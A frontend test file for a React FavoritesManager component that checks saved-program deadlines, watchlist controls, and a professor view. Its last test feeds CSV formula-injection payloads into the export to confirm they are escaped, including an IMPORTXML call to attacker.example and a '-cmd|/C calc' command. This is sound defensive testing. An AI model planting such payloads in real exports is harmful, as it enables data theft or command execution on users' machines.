import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { afterEach, describe, expect, it, vi } from 'vitest';

import axios from '../../../utils/axios';
import FavoritesManager, { savedProgramDeadlineSummary } from '../FavoritesManager';

vi.mock('../../../utils/axios', () => ({
  default: {
    get: vi.fn(),
    put: vi.fn(),
    delete: vi.fn(),
  },
}));

vi.mock('sweetalert', () => ({
  default: vi.fn(),
}));

vi.mock('../../shared/BrowseCard', () => ({
  default: ({ item }: { item: any }) => <article>{item.data.title}</article>,
}));

vi.mock('../../shared/BrowseListItem', () => ({
  default: ({ item }: { item: any }) => <article>{item.data.title}</article>,
}));

vi.mock('../../fellowship/FellowshipModal', () => ({
  default: () => null,
}));

vi.mock('../../shared/LoadingSpinner', () => ({
  default: () => <div>Loading</div>,
}));

vi.mock('../../shared/FellowshipKanbanBoard', () => ({
  default: () => <div>Program tracker</div>,
}));

const mockedAxios = axios as unknown as {
  get: ReturnType<typeof vi.fn>;
};

afterEach(() => {
  cleanup();
  vi.clearAllMocks();
  localStorage.clear();
});

describe('FavoritesManager', () => {
  it('keeps date-only saved program deadlines visible through the due date', () => {
    expect(
      savedProgramDeadlineSummary(
        [
          {
            _id: 'fellowship-1',
            id: 'fellowship-1',
            title: 'Due Today Program',
            deadline: '2026-05-22T00:00:00.000Z',
          } as any,
        ],
        new Date('2026-05-22T15:00:00.000Z'),
      ),
    ).toMatchObject({
      nextDeadlineDate: '2026-05-22T00:00:00.000Z',
      nextDeadlineLabel: 'Due Today Program: Due May 22, 2026',
    });
  });

  it('reports saved program count to the planning overview', async () => {
    const onSummaryChange = vi.fn();
    mockedAxios.get.mockImplementation((url: string) => {
      if (url === '/users/savedPrograms') {
        return Promise.resolve({
          data: {
            savedPrograms: [
              {
                _id: 'fellowship-1',
                id: 'fellowship-1',
                title: 'Summer Research Grant',
                deadline: '2099-06-30T00:00:00.000Z',
              },
            ],
          },
        });
      }
      return Promise.resolve({ data: {} });
    });

    render(
      <MemoryRouter>
        <FavoritesManager onSummaryChange={onSummaryChange} />
      </MemoryRouter>,
    );

    await screen.findByText('Summer Research Grant');

    await waitFor(() => {
      expect(onSummaryChange).toHaveBeenCalledWith({
        count: 1,
        nextDeadlineDate: '2099-06-30T00:00:00.000Z',
        nextDeadlineLabel: 'Summer Research Grant: Due Jun 30, 2099',
      });
    });
  });

  it('shows a compact student program watchlist without board planning controls', async () => {
    mockedAxios.get.mockImplementation((url: string) => {
      if (url === '/users/savedPrograms') {
        return Promise.resolve({
          data: {
            savedPrograms: [
              {
                _id: 'fellowship-1',
                id: 'fellowship-1',
                title: 'Summer Research Grant',
              },
            ],
          },
        });
      }
      return Promise.resolve({ data: { favListings: [], favListingsIds: [] } });
    });

    render(
      <MemoryRouter>
        <FavoritesManager />
      </MemoryRouter>,
    );

    await screen.findByText('Summer Research Grant');

    expect(screen.getByRole('heading', { name: 'Program watchlist' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Export' }).className).toContain('min-h-[44px]');
    expect(screen.getByTitle('Mark as applied').className).toContain('min-h-[44px]');
    expect(screen.getByTitle('Mark as applied').className).toContain('min-w-[44px]');
    expect(screen.getByTitle('Add note').className).toContain('min-h-[44px]');
    expect(screen.getByTitle('Add note').className).toContain('min-w-[44px]');
    expect(screen.queryByRole('button', { name: 'Board' })).toBeNull();
    expect(screen.queryByRole('button', { name: 'List' })).toBeNull();
    expect(screen.queryByText('Favorite Posted Roles')).toBeNull();
    expect(screen.queryByText('No posted roles found.')).toBeNull();
    await waitFor(() => {
      expect(mockedAxios.get).not.toHaveBeenCalledWith('/users/listings', expect.anything());
      expect(mockedAxios.get).not.toHaveBeenCalledWith('/users/favListingsIds', expect.anything());
    });
  });

  it('reframes saved programs for professors without application tracking controls', async () => {
    mockedAxios.get.mockImplementation((url: string) => {
      if (url === '/users/savedPrograms') {
        return Promise.resolve({
          data: {
            savedPrograms: [
              {
                _id: 'fellowship-1',
                id: 'fellowship-1',
                title: 'Summer Research Grant',
              },
            ],
          },
        });
      }
      return Promise.resolve({ data: {} });
    });

    render(
      <MemoryRouter>
        <FavoritesManager variant="professor" />
      </MemoryRouter>,
    );

    await screen.findByText('Summer Research Grant');

    expect(screen.getByRole('heading', { name: 'Funding & program references' })).toBeTruthy();
    expect(
      screen.getByText(
        'Save programs students may ask about. This is optional reference material, not an application tracker.',
      ),
    ).toBeTruthy();
    expect(screen.queryByRole('button', { name: 'Board' })).toBeNull();
    expect(screen.queryByTitle('Mark as applied')).toBeNull();
    expect(screen.queryByTitle('Add note')).toBeNull();
    expect(screen.queryByText(/application status/i)).toBeNull();
  });

  it('neutralizes spreadsheet formulas in CSV exports', async () => {
    let exportedBlob: Blob | null = null;
    const createObjectURL = vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
      exportedBlob = blob as Blob;
      return 'blob:csv-export';
    });
    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
    const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});

    mockedAxios.get.mockImplementation((url: string) => {
      if (url === '/users/savedPrograms') {
        return Promise.resolve({
          data: {
            savedPrograms: [
              {
                _id: 'fellowship-1',
                id: 'fellowship-1',
                title: ' =IMPORTXML("https://attacker.example","//a")',
                awardAmount: '+SUM(1,1)',
                applicationLink: '\t-cmd|/C calc',
                contactEmail: '\r@attacker.example',
                isAcceptingApplications: true,
              },
            ],
          },
        });
      }
      return Promise.resolve({ data: {} });
    });

    render(
      <MemoryRouter>
        <FavoritesManager />
      </MemoryRouter>,
    );

    await screen.findByText(/IMPORTXML/);

    fireEvent.click(screen.getByRole('button', { name: 'Export' }));
    fireEvent.click(screen.getByRole('button', { name: 'Export as CSV' }));

    await waitFor(() => expect(exportedBlob).not.toBeNull());
    const csv = await exportedBlob!.text();

    expect(csv).toContain('"\' =IMPORTXML(""https://attacker.example"",""//a"")"');
    expect(csv).toContain(`"'+SUM(1,1)"`);
    expect(csv).toContain('"\'\t-cmd|/C calc"');
    expect(csv).toContain('"\'\r@attacker.example"');
    expect(csv).not.toContain('" =IMPORTXML');
    expect(csv).not.toContain('"+SUM');
    expect(csv).not.toContain('"\t-cmd');
    expect(csv).not.toContain('"\r@attacker');

    createObjectURL.mockRestore();
    revokeObjectURL.mockRestore();
    clickSpy.mockRestore();
  });
});
